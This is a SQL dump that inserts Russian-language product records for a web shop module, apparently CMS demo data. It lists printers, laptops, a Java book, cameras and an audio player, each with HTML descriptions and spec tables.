INSERT INTO `cp_modul_shop_artikel` VALUES (5, 'CP-10055', 1, '1,25', 'Canon PIXMA PIXMA MP620', 1, 94.00, 0.00, 'pixima_2.jpg', 'jpg', '', '<p>Копирование, сканирование и печать. Прямая печать с камер, карт памяти, 35-мм фотоплёнок/слайдов и мобильных телефонов, предварительный просмотр на цветном TFT-дисплее 8,8 см, Wi-Fi и Ethernet</p>', '<p>Компания Canon выпустила новый принтер PIXMA &laquo;Всё в одном&raquo;, готовый к подключению к сети, с усовершенствованным механизмом печати для обеспечения исключительной производительности и оптимального соотношения цены и качества. PIXMA MP620 &ndash; идеальное решение для тех, кому необходимы функции печати, сканирования и копирования высокого качества. А совместимость со стандартами Wi-Fi и Ethernet позволяет всей семье максимально использовать функции аппарата в общей сети.<br />\r\n<br />\r\n<b>Превосходное качество печати</b><br />\r\n<br />\r\nАппарат PIXMA MP620 отличается исключительным качеством, привлекательным обтекаемым дизайном и широким набором функциональных возможностей. Благодаря усовершенствованной системе Canon ChromaLife100+, печатной головке, созданной по технологии FINE, объёму капли 1пл и разрешению 9600 точек можно получать фотографии с более плавной градацией и без зернистости. Скорость печати настолько высока, что позволяет получить отпечаток превосходного профессионального качества форматом 10х15 см примерно за 41 секунду.<br />\r\n<br />\r\nОтличное качество изображения достигается благодаря системе раздельных чернильниц с новой формулой чернил, обеспечивающей широкую цветовую палитру, естественные оттенки чёрного и живые оттенки красного. Сочетание чернил синего, малинового и жёлтого цвета на основе красителя с чёрными чернилами на основе пигмента и красителей гарантируют превосходное качество фотографий, а также чёткость текста при печати документов. Система раздельных чернильниц минимизирует расход чернил и необходимость замены.<strong><br />\r\n<br />\r\n</strong></p>', 2.000, 0, '', 1, 1148068800, 'Характеристики', '<p><b>Функции аппарата:</b>		Копирование, сканирование и печать. Прямая печать с камер, карт памяти, 35-мм фотоплёнок/слайдов и мобильных телефонов, предварительный просмотр на цветном TFT-дисплее 8,8 см, Wi-Fi и Ethernet</p>\r\n<p><b>ФУНКЦИЯ ПРИНТЕРА </b></p>\r\n<p>разрешение при печати		До 96001 x 2400 точек на дюйм<br />\r\nСпособ печати		5-цветная система струйной печати, объём капли 1 пл, система микросопел, печатающая головка, созданная по технологии FINE, технология ContrastPLUS<br />\r\nСкорость фотопечати		Печать &quot;в край&quot; (без полей), формат 10 x 15 см: прибл. 41 с (в стандартном режиме)<br />\r\nСкорость монохромной печати		До 26 стр./мин (макс.), 13,2 стр./мин (в стандартном режиме)<br />\r\nСкорость цветной печати		Текст и графика: до 18 стр./мин (макс.), 10,9 стр./мин (в стандартном режиме)<br />\r\nКонфигурация картриджа		Технология раздельных чернильниц (Single Ink) &ndash; 6 раздельных чернильниц (PGI-520BK, CLI-521C, CLI-521M, CLI-521Y, CLI-521BK, CLI-521GY)<br />\r\nТип материала для печати		Обычная бумага, конверты, профессиональная фотобумага Photo Paper Pro Platinum (PT-101), Photo Paper Pro II (PR-201), глянцевая фотобумага Photo Paper Plus Glossy II (PP-201), полуматовая фотобумага Photo Paper Plus Semi-gloss (SG-201), глянцевая бумага для повседневной фотопечати Glossy Photo Paper &quot;Everyday Use&quot; (GP-501), матовая фотобумага Matte Photo Paper (MP-101), бумага для печати с высоким разрешением High Resolution Paper (HR-101N), материал для термоперевода изображения на ткань (TR-301), фотонаклейки (PS-101), фотобумага для профессиональной печати Fine Art Paper &quot;Photo Rag&quot; (FA-PR1), допускается использование других видов высококачественной бумаги.<br />\r\nПодача материала для печати		Задний лоток: макс. 150 листов Передний лоток: макс. 150 листов<br />\r\nФормат материала для печати		Задний лоток: A4, B5, A5, Letter, Legal, конверты (размер DL или Commercial 10), 10 x 15 см, 10 x 18 см, 13 x 18 см, 20 x 25 см, формат кредитной карты (54 х 86 мм)<br />\r\nКассета: A4, B5, A5, Letter<br />\r\nПлотность материала для печати		Задний лоток: обычная бумага: 64 &ndash; 105 г/м&sup2; и рекомендованные Canon специальные материалы для печати плотностью до 300 г/м&sup2; Кассета: обычная бумага: 64 &ndash; 105 г/м&sup2;<br />\r\nДвусторонняя печать		В ручном режиме на обычной бумаге формата A4, B5, A5, Letter и 13 x 18 см (только для Windows)<br />\r\nПечать &quot;в край&quot; (без полей)		Есть (A4, Letter, 20 x 25 см, 13 x 18 см, 10 x 15 см)<br />\r\nИнтерфейс для подключения к камере		Порт Direct Print: прямая печать фотографий с цифровых фото- и видеокамер, совместимых со стандартом PictBridge<br />\r\nПрямая печать с карт памяти		CompactFlash, Microdrive, Memory Stick, Memory Stick Pro, Memory Stick Duo, Memory Stick PRO Duo, SD Memory Card, SDHC Memory Card, MultiMedia Card (Ver4.1) и MultiMedia Card Plus (Ver4.1).&nbsp;<br />\r\nxD-PictureCard 2, xD-PictureCard Type M 2, xD-PictureCard Type H 2, Memory Stick Micro 2, RS-MMC 2, mini SD Card 2, micro SD 2, mini SDHC Card 2 и micro SDHC 2.<br />\r\nФункции прямой печати с карт памяти		Печать нескольких изображений (выбор нескольких изображений и количества отпечатков для каждого изображения), печать индекса фотографии, печать до 35 фотографий на одном листе, печать всех фотографий, печать DPOF-изображений, печать макета, печать наклейки, печать информации об отпечатке, печать индексного листа фотографий, печать календарей, функция ID Photo Print, поиск по дате, слайд-шоу, печать даты и номера файла, печать без полей.<strong><br />\r\n</strong></p>', 'Расходные материалы', '<p>FA-PR1<br />\r\nGP-501<br />\r\nHR-101N<br />\r\nMP-101<br />\r\nPS-101<br />\r\nSG-201<br />\r\nTR-301</p>', 'Технологии', '<p>ТЕХНОЛОГИЯ FINE<br />\r\n<br />\r\nЗапатентованная Canon технология изготовления полупроводниковых элементов FINE даёт возможность создавать печатающие головки с исключительно высокой плотностью расположения микросопел. Это позволяет принтерам Canon обеспечивать самую высокую на рынке скорость печати и высочайшее профессиональное качество фотографий практически с полным отсутствием зернистости даже в стандартном режиме.&nbsp;<br />\r\n<br />\r\nТехнология ChromaLife100+&nbsp;<br />\r\n<br />\r\nУсовершенствованная система ChromaLife100+ позволяет получать великолепные долговечные отпечатки благодаря технологии FINE компании Canon, оригинальной фотобумаге Canon и новым чернилам на основе красителей. Показатель долговечности 100 лет может быть достигнут при хранении в обычных альбомах фотографий, напечатанных на бумаге PT-101, PR-201, PP-201, SG-201 и GP-501. Кроме того, фотографии сохраняют яркость цвета в течение 30 лет и устойчивы к воздействию газов в течение 20 лет при использовании бумаги PT-101, PR-201 и PP-201.<br />\r\n<br />\r\nТехнология раздельных чернильниц (Single Ink)<br />\r\n<br />\r\nНовая система раздельных чернильниц с новой формулой чернил обеспечивает расширенное цветовое пространство при печати на бумаге PP-201, PR-201 и PT-101 по сравнению с бумагой PR-101. Чернильницы уменьшенной высоты делают дизайн принтеров более обтекаемым и современным.&nbsp;<br />\r\n<br />\r\nФотобумага PT-101 и PR-201<br />\r\n<br />\r\nCanon расширила ассортимент оригинальной фотобумаги и теперь предлагает улучшенное качество по более низкой цене. Профессиональная фотобумага Photo Paper Pro Platinum PT-101 с плотностью 300 г/м&sup2; становится лидером в ассортименте предлагаемой Canon глянцевой фотобумаги, в то время как профессиональная фотобумага Photo Paper Pro II PR-201 заменит бумагу PR-101. Доступны форматы A4 и 10x15 см, а для широкоформатных принтеров &ndash; форматы A3 и A3+.&nbsp;<br />\r\n<br />\r\nЗащита окружающей среды<br />\r\n<br />\r\nКомпания Canon верна своему принципу предлагать продукты, оказывающие минимальное воздействие на окружающую среду, и новый модельный ряд PIXMA служит доказательством этому благодаря улучшениям, касающимся экономии ресурсов и дизайна. Такие функции, как автоматическая двусторонняя печать и печать &laquo;2 на 1&raquo; и &laquo;4 на 1&raquo;, применяемые в различных моделях PIXMA, способствуют экономии бумаги. При производстве принтеров PIXMA используется пригодная для переработки пластмасса. Это способствует уменьшению углеродного следа и количества контейнеров, необходимых для доставки продуктов. Все принтеры PIXMA соответствуют стандартам энергопотребления Energy Star</p>', 'TEST 3', '<p>TEST 3...</p>', 3, 'pixma,drucker', 0.00, 0, 999, 1, 11, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (1, 'CP-10001', 1, '1,26', 'Canon i-SENSYS MF8450', 1, 20150.00, 0.00, 'pixima_1.jpg', 'jpg', '', '<p>Цветной лазерный многофункциональный аппарат &laquo;Всё в одном&raquo;, готовый к подключению к сети: копир, принтер, факс и сканер</p>', '<p>Компания Canon представляет новую модель из серии цветных многофункциональных лазерных устройств для профессионалов &ndash; i-SENSYS MF8450. Многофункциональное лазерное устройство &laquo;4 в 1&raquo; MF8450 с возможностью подключения к сети устанавливает новые стандарты качества и скорости печати. MF8450 &ndash; идеальное устройство для компаний малого бизнеса, которые развиваются, экспериментируя с цветовыми решениями. Мощное и компактное устройство объединяет в себе множество продвинутых технологий, которыми оснащены новейшие устройства работы с изображениями. Как результат &ndash; максимальная производительность, высочайшая надёжность, а также простота в эксплуатации и эффективность.</p>\r\n<p></p>', 2.000, 0, '', 1, 1148068800, 'Характеристики', '<ul>\r\n    <li>Цветной лазерный многофункциональный аппарат &laquo;Всё в одном&raquo;, готовый к подключению к сети: копир, принтер, факс и сканер;</li>\r\n    <li>Технологии цветной печати i-SENSYS обеспечивают цветовые решения исключительного качества;</li>\r\n    <li>17 стр./мин в цветном и черно-белом режиме;</li>\r\n    <li>Время выхода первой копии &ndash; менее 14 секунд;</li>\r\n    <li>Технология моментального точечного разогрева для моментального разогрева и снижения потребления питания: энергопотребление в спящем режиме &ndash; всего 1,2 Вт;</li>\r\n    <li>Функция ОТПРАВКИ компактного формата PDF: сканирование напрямую в файл электронной почты, в сетевую папку, сканирование на интернет-факс или USB-накопитель;</li>\r\n    <li>Простой в эксплуатации TFT-дисплей с диагональю 3,5 дюйма и удобным диском прокрутки;</li>\r\n    <li>Двусторонняя печать, копирование, сканирование, отправка и получение факсов;</li>\r\n    <li>Устройство автоматической подачи документов для двусторонней печати (ADF) на 50 листов.</li>\r\n</ul>\r\n<p></p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, 'pixma,принтер', 0.00, 0, 8, 3, 13, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (3, 'CP-10201', 2, '20,21,24', 'Toshiba Satellite A300-148', 1, 23150.00, 0.00, 'nb_toshiba_satellite_a305650.jpg', 'jpg', '', '<p>15,4&quot;, 2.7кг, &nbsp;Intel Core 2 Duo 1830мгц, 1024 Mb DDR2-667MHz, 250 Gb (4200 rpm), SATA, DVD&plusmn;RW (DL), Intel GMA X3100, Bluetooth; Camera (1.3); WiFi (802.11a/b/g)</p>', '<p>Корпорация Toshiba была основана в 1875 году в Японии. В 1985 году, компанией был создан первый в мире портативный компьютер (сегодня - ноутбук).       За 126 лет своей истории компания стала транснациональной корпорацией и вошла в число крупнейших мировых производителей электроники и электротехники. Ноутбуки серий Portege и Tecra использовались космонавтами орбитальной станции &laquo;Мир&raquo; для проведения научных исследований и были по достоинству оценены во время полета благодаря своим мультимедийным возможностям. В ноябре 1997 года Toshiba произвела 10 000 000 ноутбук &ndash; абсолютный рекорд!       Ноутбуки Toshiba отличает широкий сперкт новейших технологий и стабильно высокое качество исполнения. Toshiba сотрудничает с Harman/Kardon в проектировании акустических систем ноутбуков, что позволяет производить лучшую встроенную акустику для ноутбуков.</p>', 2.700, 0, '', 1, 1130270400, 'Характеристики', '<p><strong>Процессор:</strong> 	Intel Core 2 Duo 1830 МГц (T5550) <br />\r\n<strong>Шина:</strong> 	667MHz 2Mb L2 Cache <br />\r\n<strong>Оперативная память:</strong> 	1024 Mb DDR2-667MHz <br />\r\n<strong>Жесткий диск:</strong> 	250 Gb (4200 rpm), SATA <br />\r\n<strong>Экран:</strong> 	15,4&quot; TFT WXGA Зеркальный (Glare) <br />\r\n<strong>Разрешение:</strong> 	1280x800 <br />\r\n<strong>Видеокарта:</strong> 	Intel GMA X3100, видеопамять 128+256мб <br />\r\n<strong>Звуковая карта: </strong>AC97 2.0 совместимый <br />\r\n<strong>CD привод:</strong> 	DVD&plusmn;RW (DL) <br />\r\n<strong>Связь: </strong>Cеть 10/100 МБит/с (RJ-45); Модем 56 КБит/с (RJ-11) <br />\r\n<strong>Беспроводная связь:</strong> 	Bluetooth; Camera (1.3); WiFi (802.11a/b/g) <br />\r\n<strong>Порты:</strong> 	4xUSB 2.0; FireWire (IEEE 1394); Line-out; Microphone in; TV-Out (S-video) <br />\r\n<strong>Слоты расширения: </strong>ExpressCard <br />\r\n<strong>Устройства ввода:</strong> 	Кл-ра Windows, Сенсорный планшет Touch Pad <br />\r\n<strong>Батарея: </strong>Li-Ion (до 3 часов) <br />\r\n<strong>Вес: </strong>2.7 кг <br />\r\n<strong>Корпус (Д х Ш х В):</strong> 	363 x 267 x 34 мм <br />\r\n<strong>Программное обеспечение:</strong> 	Microsoft Windows Vista Home Premium <br />\r\n<strong>Гарантия: </strong>2 года международная гарантия производителя *</p>', '', '<p></p>\r\n<p></p>', '', '&nbsp;', '', '&nbsp;', 1, 'Scaleo,Protector', 0.00, 0, 3, 1, 2, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (4, 'CP-102001', 2, '20,24', 'Acer Extensa 5220-200508Mi', 1, 15850.00, 0.00, 'nb_acer_extensa_5220_200508mi_3.jpg', 'jpg', '', '<p>15,4, 2.9кг, Intel Celeron M 2000мгц, 1024 Mb DDR2-667MHz, 80 Gb (5400 rpm), SATA, DVD&plusmn;RW, Intel GMA 950, WiFi (802.11a/b/g)</p>', '<p>Ноутбуки Acer Extensa 5220 разработаны с использованием процессоров Intel Celeron и предлагают новый взгляд на мобильные ПК для профессионалов, работающих в небольших или средних компаниях. Широкоформатный 15.4&quot; дисплей и технология Acer CrystalBrite (некоторые модели) подарит незабываемый комфорт при работе и просмотре видеофильмов.&nbsp;<br />\r\n<br />\r\nНоутбук Acer Extensa 5220 адресован в первую очередь домашним пользователям и частным предпринимателям, которые ищут полнофункциональную замену настольного ПК за разумные деньги.&nbsp;<br />\r\nLX.E8706.029</p>\r\n<p></p>', 2.900, 0, '', 0, 1150315200, 'Характеристики', '<table width="100%" cellspacing="0" cellpadding="0" border="0">\r\n    <tbody>\r\n        <tr>\r\n            <td class="cell-spec">Процессор:</td>\r\n            <td class="cell-spec">Intel Celeron M 2000&nbsp;МГц (CM-550)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Шина:</td>\r\n            <td class="cell-spec">533MHz 1Mb L2 Cache</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Оперативная&nbsp;память:</td>\r\n            <td class="cell-spec">1024 Mb DDR2-667MHz</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Жесткий диск:</td>\r\n            <td class="cell-spec">80 Gb (5400 rpm), SATA</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Экран:</td>\r\n            <td class="cell-spec">15,4&quot; TFT WXGA&nbsp;Зеркальный (Glare)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Разрешение:</td>\r\n            <td class="cell-spec">1280x800</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Видеокарта:</td>\r\n            <td class="cell-spec">Intel GMA 950, видеопамять 0+64мб</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Звуковая карта:</td>\r\n            <td class="cell-spec">AC97 2.0 совместимый</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">CD привод:</td>\r\n            <td class="cell-spec">DVD&plusmn;RW</td>\r\n        </tr>\r\n        <!--<tr><td class="cell-spec">\r\nДисковод:\r\n</td><td class="cell-spec">\r\n</td></tr-->\r\n        <tr>\r\n            <td class="cell-spec">Связь:</td>\r\n            <td class="cell-spec">Cеть 10/100 МБит/с (RJ-45); Модем 56 КБит/с (RJ-11)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Беспроводная связь:</td>\r\n            <td class="cell-spec">WiFi (802.11a/b/g)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Порты:</td>\r\n            <td class="cell-spec">4xUSB 2.0; Fast-IrDa; FireWire (IEEE 1394); Kensington security; Line-in; Line-out; Microphone in; TV-Out (S-video); VGA</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Слоты расширения:</td>\r\n            <td class="cell-spec">PCMCIA тип II + ExpressCard/54; Card Reader 5-в-1 (SD/SD-Pro/MMC/MS/xD)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Устройства ввода:</td>\r\n            <td class="cell-spec">Кл-ра Windows, Сенсорный планшет Touch Pad</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Батарея:</td>\r\n            <td class="cell-spec">Li-Ion	(до 2 часов)</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Вес:</td>\r\n            <td class="cell-spec">2.9&nbsp;кг</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Корпус&nbsp;(Д&nbsp;х&nbsp;Ш&nbsp;х&nbsp;В):</td>\r\n            <td class="cell-spec">334х243х28/35&nbsp;мм</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Программное обеспечение:</td>\r\n            <td class="cell-spec">Microsoft Windows XP Professional RU&nbsp;</td>\r\n        </tr>\r\n        <tr>\r\n            <td class="cell-spec">Гарантия:</td>\r\n            <td class="cell-spec">1 год гарантия производителя *</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n<p></p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 3, 'Scaleo', 0.00, 0, 5, 1, 5, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (8, '0001_PDF', 5, '27', 'Философия Java Библиотека программиста 4-е изд', 1, 40.00, 0.00, 'book_1.jpg', 'jpg', '', '<p>Оригинал: 	Thinking in Java (4th Edition). Авторы: 	Эккель Б. Серия: 	Библиотека программиста. Тема: 	Java. Язык программирования. 4-е издание, 2009 год, 640 стр., формат 17x23 см (70х100/16), Мягкая обложка, ISBN 978-5-388-00003-3</p>\r\n<p></p>', '<p><b>Оригинал: 	Thinking in Java (4th Edition). Авторы: 	Эккель Б. Серия: 	Библиотека программиста. Тема: 	Java. Язык программирования. 4-е издание, 2009 год, 640 стр., формат 17x23 см (70х100/16), Мягкая обложка, ISBN 978-5-388-00003-3</b></p>\r\n<p>Java нельзя понять, взглянув на него только как на коллекцию некоторых характеристик, &mdash; необходимо понять задачи этого языка как частные задачи программирования в целом.&nbsp;<br />\r\nЭта книга &mdash; о проблемах программирования: почему они стали проблемами и какой подход использует Java в их решении. Поэтому обсуждаемые в каждой главе черты языка неразрывно связаны с тем, как они используются для решения определенных задач.<br />\r\nЭта книга, выдержавшая в оригинале не одно переиздание, за глубокое и поистине философское изложение тонкостей языка считается одним из лучших пособий для программирующих на Java.<br />\r\nВ четвертом издании автор постарался полностью интегрировать усовершенствования Java SE5/6, включить и использовать их во всей книге.</p>\r\n<p></p>', 0.000, 1, '/uploads/images/adv_book.gif', 1, 1150315200, '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, 'книга,програмирование', 0.00, 0, 1000, 3, 0, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (13, 'DKJHHJ1234', 3, '28', 'Digital Ixus 55', 1, 239.00, 0.00, 'canon_1.jpg', 'jpg', '', 'Разрешение:  5 Mpx, Оптический zoom:  3x, Дисплей: 2.5'''', Матрица: 1/2.5'''', Память: SD/MMC, Тип батареи: Li-ion. Дата релиза: август 2005', 'Digital IXI 55 (IXUS 50) &ndash; новая 5,0-мегапиксельная цифровая камера. Эта модель, унаследовавшая утончённую форму недавно выпущенной компактной камеры Digital IXUS 40, отличается превосходной отделкой из нержавеющей стали, а набор новых функций роднит её со &laquo;старшей сестрой&raquo; &ndash; камерой Digital IXUS 700.', 0.600, 0, '', 0, 1151352000, 'Основное', '<p><b>Матрица</b></p>\r\n<ul>\r\n    <li>Общее число пикселов &mdash; 5 млн.</li>\r\n    <li>Физический размер &mdash; 1/2.5&quot;</li>\r\n    <li>Максимальное разрешение &mdash; 2592x1944</li>\r\n    <li>Чувствительность &mdash; 50 - 400 ISO</li>\r\n    <li>Система понижения шумов &mdash; есть</li>\r\n</ul>\r\n<p><b>Режимы съемки</b></p>\r\n<ul>\r\n    <li>Макросъёмка &mdash; есть</li>\r\n    <li>Скорость съемки &mdash; 2.1 кадр./сек</li>\r\n    <li>Таймер &mdash; есть</li>\r\n</ul>\r\n<p><b>Видоискатель и ЖК-экран</b></p>\r\n<ul>\r\n    <li>Тип видоискателя &mdash; оптический</li>\r\n    <li>ЖК-экран &mdash; 115000 пикселов, 2.50 дюйм.</li>\r\n</ul>\r\n<p><b>Фокусировка</b></p>\r\n<ul>\r\n    <li>Минимальное расстояние съемки &mdash; 0.03 м</li>\r\n</ul>\r\n<p><b>Питание</b></p>\r\n<ul>\r\n    <li>Формат аккумуляторов &mdash; свой собственный</li>\r\n    <li>Емкость аккумулятора &mdash; 700 мА*ч</li>\r\n</ul>\r\n<p><b>Другие функции и особенности</b></p>\r\n<ul>\r\n    <li>Комплектация &mdash; Фотоаппарат Canon Digital IXUS 55, Li-ion аккумулятор NB-4L, зарядное устройство, USB-кабель, видеокабель, карта памяти Secure Digital 16 Мб, ремешок на запястье, CD-ROM с программным обеспечением.</li>\r\n    <li>Дополнительная информация &mdash; Режим подводной съемки, 9-точечная интеллектуальная фокусировка AiAF, интеллектуальный датчик ориентации</li>\r\n    <li>Дата анонсирования &mdash; 2005-08-22</li>\r\n</ul>\r\n<p><b>Функциональные возможности</b></p>\r\n<ul>\r\n    <li>Баланс белого &mdash; автоматический, ручная установка, из списка</li>\r\n    <li>Вспышка &mdash; встроенная, до 3.50 м, подавление эффекта красных глаз</li>\r\n</ul>\r\n<p><b>Объектив</b></p>\r\n<ul>\r\n    <li>Фокусное расстояние (35 мм эквивалент) &mdash; 35 - 105 мм</li>\r\n    <li>Оптический Zoom &mdash; 3x</li>\r\n    <li>Диафрагма &mdash; F2.8 - F4.9</li>\r\n</ul>\r\n<p><b>Экспозиция</b></p>\r\n<ul>\r\n    <li>Выдержка &mdash; 15 - 1/1499 с</li>\r\n    <li>Ручная настройка выдержки и диафрагмы &mdash; нет</li>\r\n    <li>Экспокоррекция  &mdash; +/- 2 EV с шагом 1/3 ступени</li>\r\n</ul>\r\n<p><b>Память и интерфейсы</b></p>\r\n<ul>\r\n    <li>Тип карт памяти &mdash; SD</li>\r\n    <li>Объём памяти в поставке &mdash; 16 Мб</li>\r\n    <li>Форматы изображения &mdash; 3 JPEG</li>\r\n    <li>Интерфейсы &mdash; USB 2.0, видео, аудио</li>\r\n</ul>\r\n<p><b>Запись видео и звука</b></p>\r\n<ul>\r\n    <li>Запись видео &mdash; есть</li>\r\n    <li>Максимальное разрешение роликов &mdash; 640x480</li>\r\n    <li>Максимальная частота кадров видеоролика &mdash; 30 кадров/с</li>\r\n    <li>Запись звука &mdash; есть</li>\r\n</ul>\r\n<p><b>Размеры и вес</b></p>\r\n<ul>\r\n    <li>Размер &mdash; 86x54x22 мм</li>\r\n</ul>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, 'ixxus,foto', 0.00, 0, 1000, 2, 16, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (14, '32esdfvfds', 3, '3', 'Casio EXILIM EX-S600', 1, 3400.00, 0.00, 'casio_2.jpg', 'jpg', '', '&nbsp;ПЗС 1/2,5 дюйма (всего 6,18 млн пикселей, 6 млн пикселей эфф.) Разрешение Разрешения фото: 2816x2112 2560x1920 2560x1712 (3:2) 2304x1728 2048x1536 1600х1200 640х480 пикселей; Разрешение видео (со звуковым сопровождением): 640x480, 320x240', 'Камера EX-S600, продолжая традиции серии EXILIM CARD, буквально напичкана самыми последними электронными технологиями, облеченными в компактную, тонкую и красивую форму. Фотоснимки высокого качества, совершенные возможности видеозаписи и невероятный спектр возможностей и функций, - все это доказывает снова, что CASIO превосходит все мыслимые пределы фототехнологий, предоставляя удобное и компактное устройство для запечатления событий, которые будут храниться в памяти всю жизнь.', 0.120, 0, '', 0, 1151352000, 'Характеристики', '<ul>\r\n    <li>Эффективное разрешение	&nbsp;- 6,0 мегапикселей</li>\r\n    <li>Максимальный размер снимка	- 2816x2112</li>\r\n    <li>Система стабилизации	- электронная (Anti-Shake DSP)</li>\r\n    <li>Фокусное расстояние	- 38-144 мм</li>\r\n    <li>Оптический зум	- 3x</li>\r\n    <li>Светочувствительность	- 50,&nbsp;100, 200, 400, Auto</li>\r\n    <li>ЖК-дисплей	- 2,4&quot;, 85000 пикселей</li>\r\n    <li>Карта памяти	- SD</li>\r\n    <li>Вес камеры с учетом батареи и карты памяти	- 145 г<br />\r\n    </li>\r\n</ul>', '', '<br />', '', '&nbsp;', '', '&nbsp;', 3, 'фотоаппарат, мыльница', 0.00, 0, 1000, 2, 16, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (15, '11112', 22, '2,20,22', 'HP Compaq 530 FH524AA', 1, 20280.00, 0.00, 'hp151111.jpg', 'jpg', '', '<p>Ноутбук, Intel Celeron M 530 (1.73 ГГц), 15.4'''' WXGA (1280x800), 1024 Мб (1хDDR2), 120 Гб, Intel GMA 950 (up 224 Мб), DVD+/-RW, Modem, LAN, Wi-Fi, DOS, 2.7 кг</p>', '<p>Хотите, чтобы Ваш ноутбук не уступал по качеству изображения настольному ПК? Тогда Вы наверняка по достоинству оцените дисплей XGA с диагональю 15,4 дюйма. Лаконичный дизайн, малый вес (2,7 кг) и компактные размеры (толщина 31,9 мм) позволят Вам взять свой офис с собой и выглядеть более стильно!</p>', 2.700, 1, '/uploads/images/adv_hp.gif', 0, 1219780800, 'Технические характеристики', '<p>Диагональ дисплея &mdash; 15.4 '''' TFT<br />\r\nРазрешение дисплея &mdash; 1280х800&nbsp;<br />\r\nПроцессор &mdash; Intel Celeron M&nbsp;<br />\r\nЧастота процессора &mdash; 1730 MHz<br />\r\nОбъем оперативной памяти &mdash; 1024 Mb<br />\r\nОперативная память &mdash; DDR2&nbsp;<br />\r\nЧастота оперативной памяти &mdash; 533 MHz<br />\r\nКэш второго уровня (L2C) &mdash; 1024 Kb<br />\r\nЧипсет видео &mdash; Intel&reg; GMA 950 (shared)&nbsp;<br />\r\nРазмер видеопамяти &mdash; 224 Mb<br />\r\nЧипсет &mdash; Intel&reg; i945GM Express&nbsp;<br />\r\nРазмер жесткого диска &mdash; 120 Gb<br />\r\nCD/DVD привод &mdash; DVD-Dual DL&nbsp;<br />\r\nWi-Fi &mdash; Есть&nbsp;<br />\r\nBlueTooth &mdash; Нет&nbsp;<br />\r\nКоличество USB-портов &mdash; 2&nbsp;<br />\r\nHDMI &mdash; Нет&nbsp;<br />\r\nПоследовательный порт (COM) &mdash; Нет&nbsp;<br />\r\nПараллельный порт (LPT) &mdash; Нет&nbsp;<br />\r\nFire-Wire (IEEE 1394) &mdash; Нет&nbsp;<br />\r\nТВ выходы &mdash; Нет&nbsp;<br />\r\nВнешний монитор &mdash; VGA (D-Sub 15-pin)&nbsp;<br />\r\nPCMCIA слот &mdash; Type II&nbsp;<br />\r\nExpress Card &mdash; Нет&nbsp;<br />\r\nFM/LAN &mdash; Fax-modem 56K, LAN 10/100&nbsp;<br />\r\nЗвуковая система &mdash; Conexant Cx20468 Встроенные динамики&nbsp;<br />\r\nРабота в режиме Tablet PC &mdash; Нет&nbsp;<br />\r\nАккумулятор &mdash; Li-Ion&nbsp;<br />\r\nАвтономная работа &mdash; 3 часа 00 минут&nbsp;<br />\r\nОС &mdash; DOS&nbsp;<br />\r\nШирина &mdash; 356 mm<br />\r\nДлина &mdash; 257 mm<br />\r\nТолщина &mdash; 35 mm<br />\r\nВес &mdash; 2.7 kg<br />\r\nСканер отпечатка пальца &mdash; Нет&nbsp;<br />\r\nГарантия &mdash; 1 год&nbsp;<br />\r\nДополнительная информация &mdash; Поддержка Kensington Lock &quot;Глянцевая матрица&quot;<b><br />\r\n</b></p>', '', '<br />', '', '<br />', '', '<br />', 1, 'hp', 0.00, 0, 3, 2, 1, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (17, 'sdfsdw332', 4, '10,11,12,13', 'Плеер 1by1', 1, 1.00, 0.00, 'player.gif', 'gif', '', 'Маленький, но функциональный проигрыватель аудио файлов. The Directory Player воспроизводит MP3 файлы, но с помощью подключаемых модулей (dll/plugin) предусмотрена возможность проигрывать WAV, OGG, MP2 форматы и Audio CD диски.&nbsp;', 'Маленький, но функциональный проигрыватель аудио файлов. The Directory Player воспроизводит MP3 файлы, но с помощью подключаемых модулей (dll/plugin) предусмотрена возможность проигрывать WAV, OGG, MP2 форматы и Audio CD диски. Интерфейс плеера выполнен по аналогии Проводника Windows, т.е. в левом меню располагается дерево дисков, а в правом отображаются музыкальные файлы, расположенные в той или иной директории. Такой подход позволяет отказаться от ставших уже стандартом плей-листов и воспроизводить музыкальные файлы целыми директориями или поодиночке. Однако, все функции плей-листов (Playlist) поддерживаются. The Directory Player может работать из командной строки и поддерживает горячие клавиши (список горячих клавиш смотрите в файле Readme, расположенном в архиве с программой).&nbsp;', 0.000, 0, '', 0, 1232226000, '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 0, 'плеер, айдио', 0.00, 0, 1000, 2, 3, '', 1, '', '', '', 0, 0);
